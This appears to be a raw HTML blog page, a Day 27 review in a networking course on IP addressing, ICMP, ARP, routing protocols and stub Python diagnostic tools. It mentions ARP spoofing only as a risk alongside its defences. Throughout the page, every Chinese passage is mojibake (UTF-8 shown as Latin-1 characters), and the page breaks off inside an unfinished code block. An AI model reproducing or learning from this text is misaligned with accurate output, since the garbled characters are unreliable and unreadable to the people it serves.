href="#Day-27ï¼šç»¼åˆå®æˆ˜" class="headerlink" title="Day 27ï¼šç»¼åˆå®æˆ˜"></a>Day 27ï¼šç»¼åˆå®æˆ˜</h3><ul><li>çŸ¥è¯†ç‚¹æ•´åˆ</li><li>ç»¼åˆè¯Šæ–­å¹³å°</li><li>ç½‘ç»œæ’é”™æ¡ˆä¾‹</li><li>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>å®æˆ˜ï¼šç½‘ç»œè¯Šæ–­å¹³å°</li></ul><hr><h2 id="ğŸ¯-æ ¸å¿ƒçŸ¥è¯†ç‚¹"><a href="#ğŸ¯-æ ¸å¿ƒçŸ¥è¯†ç‚¹" class="headerlink" title="ğŸ¯ æ ¸å¿ƒçŸ¥è¯†ç‚¹"></a>ğŸ¯ æ ¸å¿ƒçŸ¥è¯†ç‚¹</h2><h3 id="1-IPåè®®"><a href="#1-IPåè®®" class="headerlink" title="1. IPåè®®"></a>1. IPåè®®</h3><p><strong>IPv4åœ°å€</strong>ï¼š</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">æ ¼å¼ï¼š<span class="hljs-number">32</span>ä½ï¼Œç‚¹åˆ†åè¿›åˆ¶<br>ç¤ºä¾‹ï¼š<span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span><br><br>åœ°å€åˆ†ç±»ï¼ˆä¼ ç»Ÿï¼‰ï¼š<br>Aç±»ï¼š<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">127</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>      (ç½‘ç»œä½<span class="hljs-number">8</span>ä½)<br>Bç±»ï¼š<span class="hljs-number">128</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">191</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (ç½‘ç»œä½<span class="hljs-number">16</span>ä½)<br>Cç±»ï¼š<span class="hljs-number">192</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">223</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (ç½‘ç»œä½<span class="hljs-number">24</span>ä½)<br>Dç±»ï¼š<span class="hljs-number">224</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">239</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (å¤šæ’­)<br>Eç±»ï¼š<span class="hljs-number">240</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span> - <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">255</span>    (ä¿ç•™)<br><br>ç§æœ‰åœ°å€ï¼š<br><span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">172.16.0.0</span>/<span class="hljs-number">12</span><br><span class="hljs-number">192.168.0.0</span>/<span class="hljs-number">16</span><br><br>ç‰¹æ®Šåœ°å€ï¼š<br><span class="hljs-number">127.0.0.1</span>         ç¯å›åœ°å€<br><span class="hljs-number">0.0.0.0</span>          æœªæŒ‡å®šåœ°å€<br><span class="hljs-number">255.255.255.255</span>  å¹¿æ’­åœ°å€<br><br>å­ç½‘åˆ’åˆ†ï¼š<br>CIDRï¼šæ— ç±»åŸŸé—´è·¯ç”±<br>VLSMï¼šå¯å˜é•¿å­ç½‘æ©ç <br></code></pre></td></tr></table></figure><p><strong>IPv6åœ°å€</strong>ï¼š</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs elixir">æ ¼å¼ï¼š<span class="hljs-number">128</span>ä½ï¼Œå†’å·åå…­è¿›åˆ¶<br>ç¤ºä¾‹ï¼š<span class="hljs-number">2001</span><span class="hljs-symbol">:db8</span>::<span class="hljs-number">1</span><br><br>å‹ç¼©è§„åˆ™ï¼š<br><span class="hljs-number">1</span>. çœç•¥å‰å¯¼é›¶<br><span class="hljs-number">2</span>. è¿ç»­é›¶ç”¨::è¡¨ç¤ºï¼ˆåªèƒ½ç”¨ä¸€æ¬¡ï¼‰<br><br>åœ°å€ç±»å‹ï¼š<br>å…¨å±€å•æ’­ï¼š<span class="hljs-number">2000</span>::/<span class="hljs-number">3</span><br>é“¾è·¯æœ¬åœ°ï¼šfe80::/<span class="hljs-number">10</span><br>å”¯ä¸€æœ¬åœ°ï¼šfc00::/<span class="hljs-number">7</span><br>å¤šæ’­ï¼šff00::/<span class="hljs-number">8</span><br>ç¯å›ï¼š::<span class="hljs-number">1</span><br><br>ä¼˜åŠ¿ï¼š<br>âœ… å·¨å¤§åœ°å€ç©ºé—´ï¼ˆ<span class="hljs-number">2</span>^<span class="hljs-number">128</span>ï¼‰<br>âœ… ç®€åŒ–å¤´éƒ¨<br>âœ… å†…ç½®å®‰å…¨æ€§<br>âœ… æ— éœ€<span class="hljs-title class_">NAT</span><br>âœ… è‡ªåŠ¨é…ç½®ï¼ˆ<span class="hljs-title class_">SLAAC</span>ï¼‰<br></code></pre></td></tr></table></figure><h3 id="2-ICMPåè®®"><a href="#2-ICMPåè®®" class="headerlink" title="2. ICMPåè®®"></a>2. ICMPåè®®</h3><p><strong>ä¸»è¦ç±»å‹</strong>ï¼š</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">Type</span> <span class="hljs-type">0/8ï¼šå›æ˜¾åº”ç­”/è¯·æ±‚ï¼ˆpingï¼‰</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">3ï¼šç›®æ ‡ä¸å¯è¾¾</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">5ï¼šé‡å®šå‘</span><br><span class="hljs-type"></span><span class="hljs-keyword">Type</span> <span class="hljs-type">11ï¼šè¶…æ—¶ï¼ˆtracerouteï¼‰</span><br><span class="hljs-type"></span><br><span class="hljs-type"></span>pingå·¥ä½œæµç¨‹ï¼š<br>å‘é€ICMP Echo Request (<span class="hljs-keyword">Type</span> <span class="hljs-type">8)</span><br><span class="hljs-type"></span>â†’ ç›®æ ‡è¿”å›Echo Reply (<span class="hljs-keyword">Type</span> <span class="hljs-type">0)</span><br><span class="hljs-type"></span>â†’ è®¡ç®—RTT<br>â†’ ç»Ÿè®¡ä¸¢åŒ…ç‡<br><br>tracerouteåŸç†ï¼š<br>TTL=<span class="hljs-number">1</span> â†’ ç¬¬<span class="hljs-number">1</span>è·³è¿”å›è¶…æ—¶<br>TTL=<span class="hljs-number">2</span> â†’ ç¬¬<span class="hljs-number">2</span>è·³è¿”å›è¶…æ—¶<br>...<br>ç›´åˆ°åˆ°è¾¾ç›®æ ‡<br></code></pre></td></tr></table></figure><h3 id="3-ARPåè®®"><a href="#3-ARPåè®®" class="headerlink" title="3. ARPåè®®"></a>3. ARPåè®®</h3><p><strong>å·¥ä½œæµç¨‹</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> æŸ¥ARPç¼“å­˜<br>   â†’ æœ‰ï¼šç›´æ¥ä½¿ç”¨<br>   â†’ æ— ï¼šç»§ç»­<br><br><span class="hljs-bullet">2.</span> å¹¿æ’­ARPè¯·æ±‚<br>   &quot;è°æ˜¯192.168.1.100ï¼Ÿæˆ‘çš„MACæ˜¯aa:bb:cc:dd:ee:ff&quot;<br><br><span class="hljs-bullet">3.</span> ç›®æ ‡ä¸»æœºå•æ’­åº”ç­”<br>   &quot;æˆ‘æ˜¯192.168.1.100ï¼Œæˆ‘çš„MACæ˜¯11:22:33:44:55:66&quot;<br><br><span class="hljs-bullet">4.</span> æ›´æ–°ARPç¼“å­˜<br><br><span class="hljs-bullet">5.</span> å‘é€æ•°æ®åŒ…<br><br>ARPå®‰å…¨é—®é¢˜ï¼š<br><span class="hljs-bullet">-</span> ARPæ¬ºéª—/ç¼“å­˜æŠ•æ¯’<br><span class="hljs-bullet">-</span> ä¸­é—´äººæ”»å‡»<br><br>é˜²å¾¡æªæ–½ï¼š<br><span class="hljs-bullet">-</span> åŠ¨æ€ARPæ£€æµ‹ï¼ˆDAIï¼‰<br><span class="hljs-bullet">-</span> é™æ€ARPç»‘å®š<br><span class="hljs-bullet">-</span> ç«¯å£å®‰å…¨<br><span class="hljs-bullet">-</span> ä½¿ç”¨åŠ å¯†åè®®<br></code></pre></td></tr></table></figure><h3 id="4-è·¯ç”±åè®®"><a href="#4-è·¯ç”±åè®®" class="headerlink" title="4. è·¯ç”±åè®®"></a>4. è·¯ç”±åè®®</h3><p><strong>è·¯ç”±è¡¨æŸ¥æ‰¾</strong>ï¼š</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs dns">æœ€é•¿å‰ç¼€åŒ¹é…ï¼š<br>ä¼˜å…ˆçº§ï¼šä¸»æœºè·¯ç”±(/<span class="hljs-number">32</span>) &gt; å­ç½‘è·¯ç”± &gt; èšåˆè·¯ç”± &gt; é»˜è®¤è·¯ç”±(/<span class="hljs-number">0</span>)<br><br>ç¤ºä¾‹ï¼š<br>è·¯ç”±è¡¨ï¼š<br><span class="hljs-number">1</span>. <span class="hljs-number">0.0.0.0</span>/<span class="hljs-number">0</span><br><span class="hljs-number">2</span>. <span class="hljs-number">10.0.0.0</span>/<span class="hljs-number">8</span><br><span class="hljs-number">3</span>. <span class="hljs-number">10.1.0.0</span>/<span class="hljs-number">16</span><br><span class="hljs-number">4</span>. <span class="hljs-number">10.1.2.0</span>/<span class="hljs-number">24</span><br><br>æŸ¥è¯¢<span class="hljs-number">10.1.2.100</span>ï¼š<br>åŒ¹é…æ‰€æœ‰è·¯ç”±ï¼Œé€‰æ‹©/<span class="hljs-number">24</span>ï¼ˆæœ€é•¿ï¼‰<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€è·¯ç”±åè®®å¯¹æ¯”</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   ç‰¹æ€§       â”‚     RIP      â”‚    OSPF      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç±»å‹         â”‚  è·ç¦»çŸ¢é‡    â”‚  é“¾è·¯çŠ¶æ€    â”‚<br>â”‚ ç®—æ³•         â”‚ Bellman-Ford â”‚  Dijkstra    â”‚<br>â”‚ åº¦é‡         â”‚  è·³æ•°        â”‚  Cost(å¸¦å®½)  â”‚<br>â”‚ æœ€å¤§è·³æ•°     â”‚  15          â”‚  æ— é™åˆ¶      â”‚<br>â”‚ æ”¶æ•›é€Ÿåº¦     â”‚  æ…¢          â”‚  å¿«          â”‚<br>â”‚ æ›´æ–°æ–¹å¼     â”‚  æ•´ä¸ªè·¯ç”±è¡¨  â”‚  é“¾è·¯çŠ¶æ€    â”‚<br>â”‚ æ›´æ–°å‘¨æœŸ     â”‚  30ç§’        â”‚  äº‹ä»¶è§¦å‘    â”‚<br>â”‚ é€‚ç”¨åœºæ™¯     â”‚  å°å‹ç½‘ç»œ    â”‚  å¤§å‹ç½‘ç»œ    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>RIPé˜²ç¯æœºåˆ¶ï¼š<br><span class="hljs-bullet">- </span>æœ€å¤§è·³æ•°ï¼ˆ15ï¼‰<br><span class="hljs-bullet">- </span>æ°´å¹³åˆ†å‰²<br><span class="hljs-bullet">- </span>æ¯’æ€§é€†è½¬<br><span class="hljs-bullet">- </span>æŠ‘åˆ¶å®šæ—¶å™¨<br><span class="hljs-bullet">- </span>è§¦å‘æ›´æ–°<br><br>OSPFç‰¹ç‚¹ï¼š<br><span class="hljs-bullet">- </span>åŒºåŸŸè®¾è®¡ï¼ˆArea 0éª¨å¹²åŒºåŸŸï¼‰<br><span class="hljs-bullet">- </span>é‚»å±…å…³ç³»å»ºç«‹<br><span class="hljs-bullet">- </span>LSAæ³›æ´ª<br><span class="hljs-bullet">- </span>SPFè®¡ç®—<br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ’»-å®æˆ˜é¡¹ç›®"><a href="#ğŸ’»-å®æˆ˜é¡¹ç›®" class="headerlink" title="ğŸ’» å®æˆ˜é¡¹ç›®"></a>ğŸ’» å®æˆ˜é¡¹ç›®</h2><h3 id="1-IPåœ°å€è®¡ç®—å™¨ï¼ˆDay-22ï¼‰"><a href="#1-IPåœ°å€è®¡ç®—å™¨ï¼ˆDay-22ï¼‰" class="headerlink" title="1. IPåœ°å€è®¡ç®—å™¨ï¼ˆDay 22ï¼‰"></a>1. IPåœ°å€è®¡ç®—å™¨ï¼ˆDay 22ï¼‰</h3><ul><li>ç½‘ç»œåœ°å€è®¡ç®—</li><li>å¹¿æ’­åœ°å€è®¡ç®—</li><li>å¯ç”¨ä¸»æœºæ•°é‡</li><li>å­ç½‘åˆ’åˆ†</li><li>VLSMè®¡ç®—</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">analyze_network</span>(<span class="hljs-params">self, network_str</span>):<br>    <span class="hljs-comment"># åˆ†æIPç½‘ç»œ</span><br>    <span class="hljs-comment"># è®¡ç®—ç½‘ç»œåœ°å€ã€å¹¿æ’­åœ°å€</span><br>    <span class="hljs-comment"># æ˜¾ç¤ºå¯ç”¨ä¸»æœºèŒƒå›´</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">subnet_division</span>(<span class="hljs-params">self, network_str, num_subnets</span>):<br>    <span class="hljs-comment"># å­ç½‘åˆ’åˆ†</span><br>    <span class="hljs-comment"># è‡ªåŠ¨è®¡ç®—æ–°å‰ç¼€é•¿åº¦</span><br>    <span class="hljs-comment"># æ˜¾ç¤ºæ‰€æœ‰å­ç½‘ä¿¡æ¯</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">vlsm_calculation</span>(<span class="hljs-params">self, network_str, requirements</span>):<br>    <span class="hljs-comment"># VLSMè®¡ç®—</span><br>    <span class="hljs-comment"># æ ¹æ®ä¸»æœºæ•°é‡éœ€æ±‚åˆ†é…</span><br>    <span class="hljs-comment"># ä¼˜åŒ–åœ°å€ç©ºé—´åˆ©ç”¨</span><br></code></pre></td></tr></table></figure><h3 id="2-IPv6åœ°å€å·¥å…·ï¼ˆDay-23ï¼‰"><a href="#2-IPv6åœ°å€å·¥å…·ï¼ˆDay-23ï¼‰" class="headerlink" title="2. IPv6åœ°å€å·¥å…·ï¼ˆDay 23ï¼‰"></a>2. IPv6åœ°å€å·¥å…·ï¼ˆDay 23ï¼‰</h3><ul><li>åœ°å€å‹ç¼©å’Œæ‰©å±•</li><li>åœ°å€ç±»å‹è¯†åˆ«</li><li>EUI-64è®¡ç®—</li><li>IPv4æ˜ å°„åœ°å€</li><li>å­ç½‘ä¿¡æ¯</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">compress_ipv6</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># å‹ç¼©IPv6åœ°å€</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">expand_ipv6</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># æ‰©å±•ä¸ºå®Œæ•´æ ¼å¼</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_address_type</span>(<span class="hljs-params">self, addr_str</span>):<br>    <span class="hljs-comment"># è¯†åˆ«åœ°å€ç±»å‹</span><br>    <span class="hljs-comment"># ç¯å›ã€é“¾è·¯æœ¬åœ°ã€å…¨å±€ç­‰</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mac_to_eui64</span>(<span class="hljs-params">self, mac_str, prefix_str</span>):<br>    <span class="hljs-comment"># MACè½¬EUI-64</span><br>    <span class="hljs-comment"># ç”ŸæˆIPv6æ¥å£æ ‡è¯†ç¬¦</span><br></code></pre></td></tr></table></figure><h3 id="3-ç½‘ç»œè¯Šæ–­å·¥å…·ï¼ˆDay-24ï¼‰"><a href="#3-ç½‘ç»œè¯Šæ–­å·¥å…·ï¼ˆDay-24ï¼‰" class="headerlink" title="3. ç½‘ç»œè¯Šæ–­å·¥å…·ï¼ˆDay 24ï¼‰"></a>3. ç½‘ç»œè¯Šæ–­å·¥å…·ï¼ˆDay 24ï¼‰</h3><ul><li>Pingå®ç°</li><li>Tracerouteå®ç°</li><li>ç½‘ç»œè´¨é‡æµ‹è¯•</li><li>ç»¼åˆè¯Šæ–­</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Ping</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># å‘é€ICMP Echo Request</span><br>        <span class="hljs-comment"># æ¥æ”¶Echo Reply</span><br>        <span class="hljs-comment"># è®¡ç®—RTTå’Œä¸¢åŒ…ç‡</span><br>        <span class="hljs-comment"># æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Traceroute</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># TTLä»1å¼€å§‹é€’å¢</span><br>        <span class="hljs-comment"># æ¥æ”¶ICMPè¶…æ—¶æ¶ˆæ¯</span><br>        <span class="hljs-comment"># è®°å½•æ¯ä¸€è·³</span><br>        <span class="hljs-comment"># æ˜¾ç¤ºè·¯å¾„</span><br></code></pre></td></tr></table></figure><h3 id="4-ARPå·¥å…·å¥—ä»¶ï¼ˆDay-25ï¼‰"><a href="#4-ARPå·¥å…·å¥—ä»¶ï¼ˆDay-25ï¼‰" class="headerlink" title="4. ARPå·¥å…·å¥—ä»¶ï¼ˆDay 25ï¼‰"></a>4. ARPå·¥å…·å¥—ä»¶ï¼ˆDay 25ï¼‰</h3><ul><li>ARPç¼“å­˜æŸ¥çœ‹</li><li>ARPæ‰«æ</li><li>ARPç›‘æ§</li><li>å®‰å…¨æ£€æµ‹</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPCache</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>        <span class="hljs-comment"># æ˜¾ç¤ºARPç¼“å­˜è¡¨</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPScanner</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan</span>(<span class="hljs-params">self, network</span>):<br>        <span class="hljs-comment"># æ‰«æç½‘ç»œæ®µ</span><br>        <span class="hljs-comment"># å‘ç°æ´»åŠ¨ä¸»æœº</span><br>        <span class="hljs-comment"># æ˜¾ç¤ºIPå’ŒMAC</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPMonitor</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">start</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># å®æ—¶ç›‘æ§ARPæµé‡</span><br>        <span class="hljs-comment"># æ£€æµ‹MACåœ°å€å˜åŒ–</span><br>        <span class="hljs-comment"># è­¦å‘Šå¼‚å¸¸æ´»åŠ¨</span><br></code></pre></td></tr></table></figure><h3 id="5-è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨ï¼ˆDay-26ï¼‰"><a href="#5-è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨ï¼ˆDay-26ï¼‰" class="headerlink" title="5. è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨ï¼ˆDay 26ï¼‰"></a>5. è·¯ç”±è¡¨æ¨¡æ‹Ÿå™¨ï¼ˆDay 26ï¼‰</h3><ul><li>è·¯ç”±è¡¨ç®¡ç†</li><li>è·¯ç”±æŸ¥æ‰¾æ¼”ç¤º</li><li>RIPåè®®æ¨¡æ‹Ÿ</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">RoutingTable</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_route</span>(<span class="hljs-params">self, route</span>):<br>        <span class="hljs-comment"># æ·»åŠ è·¯ç”±</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">lookup</span>(<span class="hljs-params">self, ip_address</span>):<br>        <span class="hljs-comment"># æœ€é•¿å‰ç¼€åŒ¹é…æŸ¥æ‰¾</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># æ˜¾ç¤ºè·¯ç”±è¡¨</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RIPSimulator</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># æ¨¡æ‹ŸRIPåè®®è¿è¡Œ</span><br>        <span class="hljs-comment"># è·¯ç”±æ›´æ–°å’Œæ”¶æ•›</span><br>        <span class="hljs-comment"># é˜²ç¯æœºåˆ¶æ¼”ç¤º</span><br></code></pre></td></tr></table></figure><h3 id="6-ç»¼åˆè¯Šæ–­å¹³å°ï¼ˆDay-27ï¼‰"><a href="#6-ç»¼åˆè¯Šæ–­å¹³å°ï¼ˆDay-27ï¼‰" class="headerlink" title="6. ç»¼åˆè¯Šæ–­å¹³å°ï¼ˆDay 27ï¼‰"></a>6. ç»¼åˆè¯Šæ–­å¹³å°ï¼ˆDay 27ï¼‰</h3><ul><li>è‡ªåŠ¨è¯Šæ–­ç½‘ç»œé—®é¢˜</li><li>ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š</li><li>æä¾›è§£å†³å»ºè®®</li></ul><p><strong>æ ¸å¿ƒåŠŸèƒ½</strong>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">NetworkDiagnostic</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">diagnose</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># 1. æ”¶é›†æœ¬æœºä¿¡æ¯</span><br>        <span class="hljs-comment"># 2. æµ‹è¯•ç½‘å…³è¿é€šæ€§</span><br>        <span class="hljs-comment"># 3. æµ‹è¯•DNSè§£æ</span><br>        <span class="hljs-comment"># 4. æµ‹è¯•å¤–ç½‘è¿é€šæ€§</span><br>        <span class="hljs-comment"># 5. è·¯å¾„è¿½è¸ª</span><br>        <span class="hljs-comment"># 6. æ€§èƒ½æµ‹è¯•</span><br>        <span class="hljs-comment"># 7. ç”ŸæˆæŠ¥å‘Š</span><br></code></pre></td></tr></table></figure><hr><h2 id="ğŸ”§-æŒæ¡çš„å·¥å…·"><a href="#ğŸ”§-æŒæ¡çš„å·¥å…·" class="headerlink" title="ğŸ”§ æŒæ¡çš„å·¥å…·"></a>ğŸ”§ æŒæ¡çš„å·¥å…·</h2><h3 id="ç½‘ç»œè¯Šæ–­å·¥å…·"><a href="#ç½‘ç»œè¯Šæ–­å·¥å…·" class="headerlink" title="ç½‘ç»œè¯Šæ–­å·¥å…·"></a>ç½‘ç»œè¯Šæ–­å·¥å…·</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 